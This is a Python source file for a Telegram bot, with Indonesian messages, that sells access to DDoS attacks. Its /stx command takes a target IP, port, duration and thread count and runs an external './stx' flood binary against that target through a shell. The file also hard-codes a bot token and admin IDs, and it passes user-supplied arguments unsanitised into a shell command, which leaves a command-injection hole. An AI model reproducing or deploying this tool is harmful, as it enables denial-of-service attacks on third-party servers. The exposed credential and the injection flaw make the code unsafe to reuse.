import telebot
import subprocess
import datetime
import time

# Bot Token
BOT_TOKEN = "7970941805:AAGvOT_-D2veOwDe8nqyxb_771sDaL425q8"
bot = telebot.TeleBot(BOT_TOKEN)

# Admin user IDs
admin_id = {"7316824198", "6147467958"} #your admin id

# Allowed Groups
ALLOWED_GROUPS = {-1002573717371} #grp chat id

# Cooldown Dictionary
attack_cooldown = {}

# Cooldown Time (in seconds)
COOLDOWN_TIME = 5  # 5 detik

@bot.message_handler(commands=["start"])
def welcome_start(message):
    user_name = message.from_user.first_name
    user_id = message.from_user.id
    username = message.from_user.username
    
    response = f'''Hallo pengguna bot VIP\n \n{user_name}!.\n
➡️ Command untuk DDoS : /stx\n
➡️ Bot hanya dapat digunakan di grup VIP : @DDOSMLBBVIP\n
➡️ Buy akses : @Sultanepoy @kecee_pyrite\n
➡️ Code by : @kecee_pyrite'''
    
    admin_message = f"User baru menggunakan bot:\nNama: @{username}\nUser ID: {user_id}"
    
    # Send a message to the admin
    for admin in admin_id:
        bot.send_message(admin, admin_message)
    
    bot.reply_to(message, response)
    
# Handler for /bgmi command (attack)
@bot.message_handler(commands=["stx"])
def handle_attack(message):
    global attack_cooldown

    user_id = message.from_user.id
    chat_id = message.chat.id
    current_time = time.time()

    # Check if bot is in an allowed group
    if chat_id not in ALLOWED_GROUPS:
        bot.reply_to(message, "❌ BOT INI HANYA DAPAT DIGUNAKAN\n DI GRUP INI : @DDOSMLBBVIP.")
        return

    # Check cooldown
    if user_id in attack_cooldown and current_time - attack_cooldown[user_id] < COOLDOWN_TIME:
        remaining_time = int(COOLDOWN_TIME - (current_time - attack_cooldown[user_id]))
        bot.reply_to(message, f"⏳ Cooldown Cik ! ! !")
        return

    # Parse command arguments
    command_parts = message.text.split()
    if len(command_parts) != 5:
        bot.reply_to(message, "⚠️ Penggunaan: /stx <ip> <port> <durasi> <thread>")
        return

    target, port, duration, thread = command_parts[1], command_parts[2], command_parts[3], command_parts[4]

    try:
        port = int(port)
        duration = int(duration)

        if duration > 1500:
            bot.reply_to(message, "❌ Error: Kebanyakan cik minimal 1500 detik.")
            return

        # Update cooldown time
        attack_cooldown[user_id] = current_time

        # Execute attack (Replace with actual command)
        attack_command = f"./stx {target} {port} {duration} {thread}"
        bot.reply_to(message, f"🔥 Bot mengirim santet ke {target}:{port} dalam {duration} detik dengan {thread}.")
        subprocess.run(attack_command, shell=True)
        bot.reply_to(message, f"🔥 Done Ga Bang ?")

    except ValueError:
        bot.reply_to(message, "❌ Error: Port dan Durasi berupa angka.")


# Start the bot
bot.polling(none_stop=True)